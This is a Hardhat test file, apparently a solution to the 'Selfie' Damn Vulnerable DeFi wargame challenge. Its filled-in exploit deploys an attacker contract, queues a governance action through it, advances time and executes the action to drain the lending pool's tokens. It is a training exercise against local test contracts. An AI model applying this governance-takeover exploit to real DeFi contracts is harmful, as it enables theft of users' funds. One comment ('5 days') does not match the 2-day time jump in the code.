const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        console.log(`Attacker wallet: ${await attacker.address}`);
        const contractFactory = await ethers.getContractFactory("SelfieAttacker", deployer);
        const contract = (await contractFactory.deploy(
            await this.pool.address,
            await this.token.address,
            await this.governance.address
        )).connect(attacker);

        let txn = await contract.attack();
        txn.wait();
        console.log(`Attack hash = ${txn.hash}`);

        // using the txn.hash to get the receipt and the logs events
        let receipt = await ethers.provider.getTransactionReceipt(txn.hash);

        // find the ActionQueued event and get the `actionId`
        const actionQueued = receipt.logs.map(log => {
                try {
                    return this.governance.interface.parseLog(log);
                } catch (e) {
                    return null;
                }
            }
        ).filter(log => log != null
        ).filter(log => log.name === 'ActionQueued')[0];

        const actionId = actionQueued.args.actionId.toNumber();
        console.log(`ActionId: ${actionId}`);
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days

        // execute the action with the given actionId
        txn = await this.governance.executeAction(actionId);
        txn.wait(1);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
